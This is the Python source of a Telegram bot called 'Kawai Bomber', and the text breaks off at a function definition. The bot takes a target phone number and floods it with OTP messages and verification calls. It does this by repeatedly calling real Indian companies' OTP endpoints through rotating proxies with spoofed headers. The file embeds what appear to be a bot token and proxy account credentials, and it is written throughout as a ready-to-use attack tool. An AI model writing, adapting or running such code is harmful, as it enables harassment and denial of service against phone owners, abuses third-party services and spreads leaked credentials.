#!/usr/bin/env python3
"""
KAWAI BOMBER - Advanced SMS/Call Bombing Bot
Made with ❤️ by @zerocyph
"""

import asyncio
import aiohttp
import json
import random
import logging
import sys
import os
from datetime import datetime, timedelta
from typing import Dict, List, Set, Optional, Tuple
from collections import defaultdict

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Telegram Bot Imports
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler
)
from telegram.constants import ParseMode
from telegram.error import TelegramError, NetworkError, Conflict

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8165905656:AAH-rzFBoBCdKMb9A-wv2hx0Hm9RgvGa8m0")
ADMIN_IDS = {8291098446}  # Your user ID
APPROVED_USERS = set()
BANNED_USERS = set()
USER_DATABASE = {}

# Conversation states
PHONE, CONFIRM, BOMB_TYPE = range(3)

# Anime-inspired emojis and styling
EMOJIS = {
    # Basic
    "bomb": "💣", "phone": "📱", "call": "📞", "sms": "💬", "fire": "🔥",
    "rocket": "🚀", "warning": "⚠️", "success": "✅", "error": "❌",
    "clock": "⏰", "stats": "📊", "admin": "👑", "user": "👤", "ban": "🚫",
    "unban": "🔓", "settings": "⚙️", "power": "⚡", "heart": "❤️",
    
    # Anime theme
    "star": "⭐", "flower": "🌸", "sparkles": "✨", "zap": "⚡",
    "boom": "💥", "cyclone": "🌀", "dizzy": "💫", "shield": "🛡️",
    "crown": "👑", "tada": "🎉", "confetti": "🎊", "sparkle": "❇️",
    "ring": "💍", "gem": "💎", "trophy": "🏆", "medal": "🏅",
    
    # Functional
    "target": "🎯", "speed": "⚡", "bar_chart": "📈", "list": "📋",
    "working": "🟢", "rotation": "🔄", "api": "🔌", "server": "🖥️",
    "cpu": "🧠", "memory": "💾", "disk": "💿", "os": "💻", "python": "🐍",
    "help": "❓", "activity": "📈", "total": "🔢", "sessions": "🔄",
    "proxy": "🛡️", "rank": "🏅", "level": "📊", "premium": "⭐",
    "permissions": "🔐", "limit": "⏳", "broadcast": "📢", "quick": "⚡",
    "attack": "⚔️", "damage": "💢", "victory": "🏁", "defense": "🛡️",
    "magic": "🔮", "ninja": "🥷", "samurai": "🗡️", "katana": "⚔️",
    "cherry": "🌸", "dragon": "🐉", "phoenix": "🔥", "tiger": "🐅",
    "fox": "🦊", "cat": "🐱", "rabbit": "🐰", "bear": "🐻",
    "panda": "🐼", "monkey": "🐵", "bird": "🐦", "fish": "🐠",
    "butterfly": "🦋", "unicorn": "🦄", "rainbow": "🌈", "cloud": "☁️",
    "moon": "🌙", "sun": "☀️", "star2": "🌟", "comet": "☄️",
    "galaxy": "🌌", "planet": "🪐", "alien": "👽", "robot": "🤖",
    
    # Fixed missing emojis
    "example": "📝", "rate": "📈", "target": "🎯"
}

# ASCII Art Banner
BANNER = """
╔═══╗╔╗    ╔═══╗╔╗ ╔╗╔════╗╔═══╗╔═══╗╔═══╗
║╔═╗║║║    ║╔══╝║║ ║║╚══╗═║║╔══╝║╔═╗║║╔══╝
║║ ╚╝║║    ║╚══╗║║ ║║  ╔╝╔╝║╚══╗║║ ║║║╚══╗
║║╔═╗║║ ╔╗ ║╔══╝║║ ║║ ╔╝╔╝ ║╔══╝║║ ║║║╔══╝
║╚╩═║║╚═╝║ ║╚══╗║╚═╝║╔╝═╚═╗║╚══╗║╚═╝║║╚══╗
╚═══╝╚═══╝ ╚═══╝╚═══╝╚════╝╚═══╝╚═══╝╚═══╝
"""

# Proxy List (40+ proxies)
PROXIES = [
    "px711001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043006.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1160303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1400403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px022409.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013304.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px060301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px014236.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px950403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px340403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016008.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1210303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px173003.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px500401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px710701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px041202.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040805.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px580801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px510201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px990502.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px810503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px210404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px100801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px730503.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px350401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px130501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px380101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px090404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px220601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px410701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px052001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1390303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px121102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:purevpn0s12840722:vkgp6jo"
]

# API Endpoints (Updated with all your APIs)
API_ENDPOINTS = [
    # SMS APIs
    {
        "name": "Hungama",
        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "type": "sms",
        "payload": {
            "mobileNo": "{phone}",
            "countryCode": "+91",
            "appCode": "un",
            "messageId": "1",
            "subject": "Register",
            "priority": "1",
            "device": "web",
            "variant": "v1",
            "templateCode": 1
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Meru Cab",
        "endpoint": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "type": "sms",
        "payload": {"mobile_number": "{phone}"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0"
        }
    },
    {
        "name": "Dayco India",
        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "type": "sms",
        "payload": {
            "api": "send_otp",
            "brand": "dayco",
            "mob": "{phone}",
            "resend_otp": "resend_otp"
        },
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        }
    },
    {
        "name": "Doubtnut",
        "endpoint": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "type": "sms",
        "payload": {
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "phone_number": "{phone}",
            "language": "en",
            "udid": "b751fb63c0ae17ba",
            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
        },
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/5.0.0-alpha.2"
        }
    },
    {
        "name": "NoBroker",
        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "type": "sms",
        "payload": {"phone": "{phone}", "countryCode": "IN"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        }
    },
    {
        "name": "Shiprocket",
        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "type": "sms",
        "payload": {"mobileNumber": "{phone}"},
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        }
    },
    {
        "name": "KPN Fresh",
        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "type": "sms",
        "payload": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        }
    },
    {
        "name": "Servetel",
        "endpoint": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "type": "sms",
        "payload": {"mobile_number": "{phone}"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)"
        }
    },
    
    # CALL APIs
    {
        "name": "Tata Capital",
        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "type": "call",
        "payload": {
            "phone": "{phone}",
            "applSource": "",
            "isOtpViaCallAtLogin": "true"
        },
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "name": "Physics Wallah",
        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "type": "call",
        "payload": {
            "organizationId": "5eb393ee95fab7468a79d189",
            "mobile": "{phone}"
        },
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        "name": "1mg Pharmacy",
        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "type": "call",
        "payload": {
            "number": "{phone}",
            "is_corporate_user": False,
            "otp_on_call": True
        },
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        "name": "Swiggy",
        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "type": "call",
        "payload": {"mobile": "{phone}"},
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "Swiggy-Android"
        }
    }
]

# ==================== GLOBAL VARIABLES ====================
active_attacks = {}
user_statistics = defaultdict(lambda: {
    "sms_count": 0,
    "call_count": 0,
    "total_sessions": 0,
    "last_active": datetime.now(),
    "total_hits": 0
})
bot_statistics = {
    "total_users": 0,
    "active_attacks": 0,
    "total_sms_sent": 0,
    "total_calls_made": 0,
    "total_sessions": 0,
    "total_hits": 0,
    "bot_uptime": datetime.now(),
    "requests_per_minute": 0
}

# ==================== PROXY MANAGER ====================
class ProxyRotationManager:
    def __init__(self, proxy_list):
        self.proxies = proxy_list
        self.current_index = 0
        
    def get_next_proxy(self):
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return self._format_proxy(proxy)
    
    def get_random_proxy(self):
        """Get random proxy"""
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return self._format_proxy(proxy)
    
    def _format_proxy(self, proxy_str):
        """Format proxy string to aiohttp format"""
        try:
            # Format: host:port:username:password
            if ":" not in proxy_str:
                return None
                
            host_port, creds = proxy_str.rsplit(":", 1)
            host, port = host_port.rsplit(":", 1)
            username, password = creds.split(":", 1)
            
            return f"http://{username}:{password}@{host}:{port}"
        except:
            return None
    
    def get_proxy_count(self):
        return len(self.proxies)

proxy_manager = ProxyRotationManager(PROXIES)

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self, target_number, user_id, attack_type="sms"):
        self.target = target_number
        self.user_id = user_id
        self.attack_type = attack_type  # "sms", "call", "both"
        self.is_running = False
        self.start_time = None
        self.success_count = 0
        self.failed_count = 0
        self.active_apis = []
        
    async def launch_attack(self, duration_minutes=60):
        """Launch attack with time limit"""
        self.is_running = True
        self.start_time = datetime.now()
        
        # Filter APIs based on attack type
        if self.attack_type == "sms":
            self.active_apis = [api for api in API_ENDPOINTS if api["type"] == "sms"]
        elif self.attack_type == "call":
            self.active_apis = [api for api in API_ENDPOINTS if api["type"] == "call"]
        else:  # both
            self.active_apis = API_ENDPOINTS
        
        # Calculate end time (0 = unlimited)
        end_time = None
        if duration_minutes > 0:
            end_time = self.start_time + timedelta(minutes=duration_minutes)
        
        # Create attack tasks for each API
        attack_tasks = []
        for api in self.active_apis:
            task = asyncio.create_task(self._execute_api_attack(api, end_time))
            attack_tasks.append(task)
        
        # Wait for all tasks or timeout
        try:
            await asyncio.gather(*attack_tasks)
        except asyncio.CancelledError:
            pass
        finally:
            self.is_running = False
        
        return self.success_count
    
    async def _execute_api_attack(self, api_config, end_time):
        """Execute continuous attacks using specific API"""
        while self.is_running:
            # Check time limit
            if end_time and datetime.now() >= end_time:
                break
            
            try:
                # Send request
                success = await self._send_attack_request(api_config)
                
                if success:
                    self.success_count += 1
                    # Update statistics
                    if api_config["type"] == "sms":
                        user_statistics[self.user_id]["sms_count"] += 1
                        bot_statistics["total_sms_sent"] += 1
                    else:
                        user_statistics[self.user_id]["call_count"] += 1
                        bot_statistics["total_calls_made"] += 1
                    
                    user_statistics[self.user_id]["total_hits"] += 1
                    bot_statistics["total_hits"] += 1
                
                # Ultra-fast delay for aggressive bombing
                await asyncio.sleep(random.uniform(0.05, 0.15))
                
            except Exception as e:
                self.failed_count += 1
                await asyncio.sleep(0.2)
    
    async def _send_attack_request(self, api_config):
        """Send HTTP request with proxy rotation"""
        try:
            # Get random proxy
            proxy_url = proxy_manager.get_random_proxy()
            
            # Prepare timeout
            timeout = aiohttp.ClientTimeout(total=3)
            
            # Prepare headers with randomization
            headers = api_config.get("headers", {}).copy()
            
            # Add random IP addresses
            random_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Forwarded-For"] = random_ip
            headers["Client-IP"] = random_ip
            
            # Prepare payload
            payload = {}
            for key, value in api_config["payload"].items():
                if isinstance(value, str) and "{phone}" in value:
                    payload[key] = value.replace("{phone}", self.target)
                else:
                    payload[key] = value
            
            # Create connector
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            ) as session:
                
                if api_config["method"] == "POST":
                    content_type = headers.get("Content-Type", "")
                    
                    if content_type.startswith("application/x-www-form-urlencoded"):
                        # Form data
                        data = aiohttp.FormData()
                        for key, value in payload.items():
                            data.add_field(key, str(value))
                        
                        async with session.post(
                            api_config["endpoint"],
                            data=data,
                            headers=headers,
                            proxy=proxy_url
                        ) as response:
                            return response.status in [200, 201, 202]
                    else:
                        # JSON data
                        async with session.post(
                            api_config["endpoint"],
                            json=payload,
                            headers=headers,
                            proxy=proxy_url
                        ) as response:
                            return response.status in [200, 201, 202]
                else:
                    # GET request
                    async with session.get(
                        api_config["endpoint"],
                        headers=headers,
                        proxy=proxy_url
                    ) as response:
                        return response.status in [200, 201, 202]
                        
        except Exception as e:
            return False
    
    def stop_attack(self):
        """Stop the attack"""
        self.is_running = False
    
    def get_attack_stats(self):
        """Get current attack statistics"""
        if not self.start_time:
            return {
                "success": 0,
                "failed": 0,
                "duration": 0,
                "speed": 0
            }
        
        duration = (datetime.now() - self.start_time).total_seconds()
        if duration > 0:
            speed = self.success_count / duration
        else:
            speed = 0
        
        return {
            "success": self.success_count,
            "failed": self.failed_count,
            "total": self.success_count + self.failed_count,
            "duration": duration,
            "speed": speed,
            "active_apis": len(self.active_apis)
        }

# ==================== TELEGRAM BOT HANDLERS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome command with anime-style interface"""
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    
    # Check if user is banned
    if user_id in BANNED_USERS:
        await update.message.reply_text(
            f"{EMOJIS['ban']} <b>ACCESS DENIED!</b>\n\n"
            f"{EMOJIS['warning']} You have been banned from using this bot.\n"
            f"{EMOJIS['heart']} Contact admin for appeal.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Register new user
    if user_id not in USER_DATABASE:
        USER_DATABASE[user_id] = {
            "username": username,
            "join_date": datetime.now(),
            "is_premium": user_id in APPROVED_USERS,
            "attack_count": 0,
            "last_seen": datetime.now()
        }
        bot_statistics["total_users"] = len(USER_DATABASE)
    
    # Create welcome message
    welcome_message = f"""
{EMOJIS['sparkles']} <b>｡☆✼★━━━━━━━━━━━━━━━★✼☆｡</b>
{EMOJIS['crown']} <b>Kawai Bomber v3.0</b> {EMOJIS['crown']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['flower']} <b>Konichiwa, {username}-san!</b> {EMOJIS['flower']}

{EMOJIS['dragon']} <b>⚔️ ULTIMATE BOMBING POWER</b>
{EMOJIS['ninja']} <b>🎯 Precision Targeting System</b>
{EMOJIS['phoenix']} <b>🔥 Aggressive Attack Engine</b>
{EMOJIS['fox']} <b>🦊 Smart Proxy Rotation</b>
{EMOJIS['unicorn']} <b>🌈 Anime-Inspired Interface</b>

<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['star']} <b>Quick Commands:</b>
• /bomb - Launch attack
• /stop - Stop attack
• /status - Bot statistics
• /mystats - Your profile
• /help - Get help

<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>Crafted with love by @zerocyph</i>
{EMOJIS['power']} <i>Powered by Kawai Technology</i>
<b>｡☆✼★━━━━━━━━━━━━━━━★✼☆｡</b>
"""
    
    # Create interactive keyboard
    keyboard_buttons = [
        [
            InlineKeyboardButton(
                f"{EMOJIS['bomb']} START BOMBING",
                callback_data="start_bombing"
            ),
            InlineKeyboardButton(
                f"{EMOJIS['stats']} STATS",
                callback_data="show_stats"
            )
        ],
        [
            InlineKeyboardButton(
                f"{EMOJIS['help']} GUIDE",
                callback_data="show_help"
            ),
            InlineKeyboardButton(
                f"{EMOJIS['settings']} SETTINGS",
                callback_data="user_settings"
            )
        ]
    ]
    
    # Add admin panel for admins
    if user_id in ADMIN_IDS:
        keyboard_buttons.append([
            InlineKeyboardButton(
                f"{EMOJIS['admin']} ADMIN PANEL",
                callback_data="admin_dashboard"
            )
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard_buttons)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start bombing conversation"""
    user_id = update.effective_user.id
    
    # Security checks
    if user_id in BANNED_USERS:
        await update.message.reply_text(
            f"{EMOJIS['ban']} <b>You are banned!</b>",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    if user_id in active_attacks:
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>Active attack detected!</b>\n\n"
            f"You already have a running attack.\n"
            f"Use /stop to end it first.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    # Ask for phone number
    await update.message.reply_text(
        f"{EMOJIS['phone']} <b>ENTER TARGET NUMBER</b>\n\n"
        f"{EMOJIS['warning']} <i>10 digits only, without +91</i>\n"
        f"{EMOJIS['example']} Example: <code>9876543210</code>\n\n"
        f"{EMOJIS['target']} Please enter the number:",
        parse_mode=ParseMode.HTML
    )
    
    return PHONE

async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process phone number input"""
    phone_input = update.message.text.strip()
    
    # Validate phone number
    if not phone_input.isdigit() or len(phone_input) != 10:
        await update.message.reply_text(
            f"{EMOJIS['error']} <b>INVALID INPUT!</b>\n\n"
            f"Please enter exactly 10 digits.\n"
            f"{EMOJIS['example']} Example: <code>9876543210</code>\n\n"
            f"Try again:",
            parse_mode=ParseMode.HTML
        )
        return PHONE
    
    # Store phone number
    context.user_data["target_phone"] = phone_input
    
    # Request confirmation
    confirm_keyboard = [
        [
            InlineKeyboardButton(
                f"{EMOJIS['success']} CONFIRM ATTACK",
                callback_data="confirm_attack"
            ),
            InlineKeyboardButton(
                f"{EMOJIS['error']} CANCEL",
                callback_data="cancel_attack"
            )
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(confirm_keyboard)
    
    await update.message.reply_text(
        f"{EMOJIS['warning']} <b>ATTACK CONFIRMATION</b>\n\n"
        f"{EMOJIS['target']} <b>Target:</b> <code>{phone_input}</code>\n"
        f"{EMOJIS['dragon']} <b>Type:</b> SMS + Call Bombing\n\n"
        f"{EMOJIS['fire']} <b>Proceed with attack?</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return CONFIRM

async def handle_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle attack confirmation"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "cancel_attack":
        await query.edit_message_text(
            f"{EMOJIS['success']} <b>ATTACK CANCELLED</b>\n\n"
            f"{EMOJIS['shield']} No attack was launched.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    # Show attack type selection
    attack_types_keyboard = [
        [
            InlineKeyboardButton(
                f"{EMOJIS['sms']} SMS ONLY",
                callback_data="attack_sms"
            ),
            InlineKeyboardButton(
                f"{EMOJIS['call']} CALL ONLY",
                callback_data="attack_call"
            )
        ],
        [
            InlineKeyboardButton(
                f"{EMOJIS['fire']} COMBINED",
                callback_data="attack_both"
            ),
            InlineKeyboardButton(
                f"{EMOJIS['zap']} EXTREME",
                callback_data="attack_extreme"
            )
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(attack_types_keyboard)
    
    await query.edit_message_text(
        f"{EMOJIS['bomb']} <b>SELECT ATTACK MODE</b>\n\n"
        f"{EMOJIS['sms']} <b>SMS Only</b> - Text message bombing\n"
        f"{EMOJIS['call']} <b>Call Only</b> - Voice call bombing\n"
        f"{EMOJIS['fire']} <b>Combined</b> - SMS + Calls\n"
        f"{EMOJIS['zap']} <b>Extreme</b> - Maximum aggression",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return BOMB_TYPE

async def handle_attack_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle attack type selection and launch attack"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    target_phone = context.user_data["target_phone"]
    attack_type = query.data.replace("attack_", "")
    
    # Determine duration based on user status
    if user_id in ADMIN_IDS or user_id in APPROVED_USERS:
        attack_duration = 0  # Unlimited
        duration_text = "∞ (UNLIMITED)"
    else:
        attack_duration = 60  # 1 hour
        duration_text = "60 minutes"
    
    # Map attack types
    type_display = {
        "sms": "SMS Bombing",
        "call": "Call Bombing",
        "both": "Combined Attack",
        "extreme": "Extreme Mode"
    }
    
    # Create attack engine
    attack_engine = AttackEngine(target_phone, user_id, attack_type)
    
    # Store attack information
    active_attacks[user_id] = {
        "engine": attack_engine,
        "target": target_phone,
        "type": attack_type,
        "start_time": datetime.now(),
        "chat_id": update.effective_chat.id,
        "message_id": query.message.message_id
    }
    
    # Update statistics
    bot_statistics["active_attacks"] += 1
    bot_statistics["total_sessions"] += 1
    user_statistics[user_id]["total_sessions"] += 1
    user_statistics[user_id]["last_active"] = datetime.now()
    
    # Launch attack in background
    asyncio.create_task(_execute_attack_session(user_id, attack_engine, attack_duration))
    
    # Send attack initiated message
    initiation_message = f"""
{EMOJIS['rocket']} <b>⚡ ATTACK INITIATED ⚡</b>

{EMOJIS['target']} <b>TARGET:</b> <code>{target_phone}</code>
{EMOJIS['bomb']} <b>MODE:</b> {type_display[attack_type]}
{EMOJIS['clock']} <b>DURATION:</b> {duration_text}
{EMOJIS['proxy']} <b>PROXIES:</b> {proxy_manager.get_proxy_count()}
{EMOJIS['api']} <b>APIS:</b> {len(attack_engine.active_apis)}

{EMOJIS['zap']} <b>STATUS:</b> <i>Launching attack sequence...</i>

{EMOJIS['warning']} Use /stop to cancel attack
"""
    
    await query.edit_message_text(
        initiation_message,
        parse_mode=ParseMode.HTML
    )
    
    # Start live updates
    asyncio.create_task(_update_attack_stats(user_id, context))
    
    return ConversationHandler.END

async def _execute_attack_session(user_id: int, engine: AttackEngine, duration: int):
    """Execute attack session with time limit"""
    try:
        await engine.launch_attack(duration)
    except Exception as e:
        logger.error(f"Attack error for user {user_id}: {str(e)}")
    finally:
        # Clean up after attack ends
        if user_id in active_attacks:
            bot_statistics["active_attacks"] = max(0, bot_statistics["active_attacks"] - 1)
            if user_id in active_attacks:
                del active_attacks[user_id]

async def _update_attack_stats(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Update live attack statistics"""
    update_interval = 3  # Seconds
    
    while user_id in active_attacks:
        try:
            attack_info = active_attacks[user_id]
            engine = attack_info["engine"]
            stats = engine.get_attack_stats()
            
            # Calculate progress
            progress_percent = min(stats["success"] / 100, 1.0)
            bar_length = 15
            filled_bars = int(bar_length * progress_percent)
            progress_bar = "█" * filled_bars + "░" * (bar_length - filled_bars)
            
            # Calculate attack speed
            speed_text = f"{stats['speed']:.1f}/s" if stats['speed'] > 1 else f"{stats['speed']*60:.1f}/min"
            
            # Create live update message
            live_stats = f"""
{EMOJIS['rocket']} <b>⚡ LIVE ATTACK IN PROGRESS ⚡</b>

{EMOJIS['target']} <b>TARGET:</b> <code>{attack_info['target']}</code>
{EMOJIS['clock']} <b>TIME:</b> {int(stats['duration'])}s

{EMOJIS['bar_chart']} <b>PROGRESS:</b> [{progress_bar}] {progress_percent*100:.0f}%

{EMOJIS['stats']} <b>STATISTICS:</b>
├─ {EMOJIS['success']} <b>HITS:</b> {stats['success']}
├─ {EMOJIS['error']} <b>MISSES:</b> {stats['failed']}
├─ {EMOJIS['speed']} <b>SPEED:</b> {speed_text}
└─ {EMOJIS['api']} <b>ACTIVE APIS:</b> {stats['active_apis']}

{EMOJIS['fire']} <i>Attack is running...</i>
"""
            
            try:
                await context.bot.edit_message_text(
                    chat_id=attack_info["chat_id"],
                    message_id=attack_info["message_id"],
                    text=live_stats,
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                logger.error(f"Failed to update message: {e}")
            
            await asyncio.sleep(update_interval)
            
        except Exception as e:
            logger.error(f"Error updating attack stats: {e}")
            break

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop active attack"""
    user_id = update.effective_user.id
    
    if user_id not in active_attacks:
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>NO ACTIVE ATTACK</b>\n\n"
            f"You don't have any running attacks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    attack_info = active_attacks[user_id]
    engine = attack_info["engine"]
    stats = engine.get_attack_stats()
    
    # Stop the engine
    engine.stop_attack()
    
    # Calculate success rate
    total_attempts = stats["success"] + stats["failed"]
    success_rate = (stats["success"] / total_attempts * 100) if total_attempts > 0 else 0
    
    # Create summary message
    summary_message = f"""
{EMOJIS['victory']} <b>🎉 ATTACK COMPLETED 🎉</b>

{EMOJIS['target']} <b>TARGET:</b> <code>{attack_info['target']}</code>
{EMOJIS['clock']} <b>DURATION:</b> {int(stats['duration'])} seconds

{EMOJIS['trophy']} <b>RESULTS:</b>
├─ {EMOJIS['success']} <b>SUCCESSFUL:</b> {stats['success']}
├─ {EMOJIS['error']} <b>FAILED:</b> {stats['failed']}
├─ {EMOJIS['total']} <b>TOTAL ATTEMPTS:</b> {total_attempts}
├─ {EMOJIS['rate']} <b>SUCCESS RATE:</b> {success_rate:.1f}%
└─ {EMOJIS['api']} <b>APIS USED:</b> {stats['active_apis']}

{EMOJIS['fire']} <b>Attack finished successfully!</b>
"""
    
    await update.message.reply_text(
        summary_message,
        parse_mode=ParseMode.HTML
    )
    
    # Clean up
    if user_id in active_attacks:
        bot_statistics["active_attacks"] = max(0, bot_statistics["active_attacks"] - 1)
        del active_attacks[user_id]

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
